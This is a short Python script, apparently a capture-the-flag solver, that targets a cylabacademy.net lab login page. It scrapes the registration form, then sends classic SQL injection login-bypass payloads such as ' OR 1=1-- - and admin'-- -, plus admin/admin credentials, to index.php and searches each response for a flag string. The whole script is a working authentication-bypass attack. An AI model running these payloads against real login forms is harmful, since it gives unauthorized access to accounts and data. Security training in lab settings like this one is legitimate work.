import sys, requests, urllib3, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
urllib3.disable_warnings()
BASE = "http://chatelaine.cylabacademy.net:19299/"
s = requests.Session()
r = s.get(BASE + "register.php", timeout=15)
print("register.php:", r.status_code, len(r.text))
for m in re.finditer(r"<input[^>]*>|<form[^>]*>", r.text):
    print("  ", m.group(0)[:140])
tests = [
    ("' OR 1=1-- -", "x"),
    ("admin'-- -", "x"),
    ("' or '1'='1", "' or '1'='1"),
    ("admin", "admin"),
]
for u, p in tests:
    try:
        r = s.post(BASE + "index.php", data={"username": u, "password": p}, timeout=15)
        m = re.search(r"(?:academy|picoCTF)\{[^}]*\}", r.text)
        txt = re.sub(r"<[^>]+>", " ", r.text)
        txt = re.sub(r"\s+", " ", txt)
        print("%-16s/%-12s -> %d | %s" % (u[:16], p[:12], len(r.text),
              ("FLAG " + m.group(0)) if m else txt[:120]))
    except Exception as e:
        print(u, "ERR", type(e).__name__)
